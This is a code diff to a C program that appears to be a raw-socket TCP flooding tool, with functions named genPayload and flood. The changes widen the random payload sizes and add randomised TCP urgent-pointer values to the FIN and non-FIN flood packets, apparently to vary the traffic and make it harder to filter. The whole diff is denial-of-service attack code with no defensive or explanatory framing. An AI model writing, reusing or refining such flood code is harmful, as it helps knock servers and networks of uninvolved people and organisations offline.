@@ -164,7 +164,7 @@ void setup_tcp_header(struct tcphdr *tcph, struct tcpopts *opts)
 
 char *genPayload(int size)
 {
-    char *newPayload = (char *)malloc(size * sizeof(char));
+    char *newPayload = (char *)malloc(size);
     for (int i = 0; i < size; i++)
     {
         if (i % 2 == 0)
@@ -251,13 +251,21 @@ void *flood(void *par1)
         if (finSet == 1)
         {
             tcph->fin = 1;
+            if (randnum(0, 1) == 1)
+            {
+                tcph->urg_ptr = htons(randnum(2048, 65535));
+            }
+            else
+            {
+                tcph->urg_ptr = htons(0);
+            }
             for (int i = 0; i <= 1; i++)
             {
                 if (i == 1)
                 {
                     tcph->fin = 0;
                 }
-                int randomPayloadLength = randnum(128, 256);
+                int randomPayloadLength = randnum(128, 512);
                 char *randomPayload = genPayload(randomPayloadLength);
 
                 memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
@@ -276,7 +284,8 @@ void *flood(void *par1)
         else
         {
             tcph->fin = 0;
-            int randomPayloadLength = randnum(128, 512);
+            tcph->urg_ptr = htons(randnum(2048, 65535));
+            int randomPayloadLength = randnum(256, 512);
             char *randomPayload = genPayload(randomPayloadLength);
 
             memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
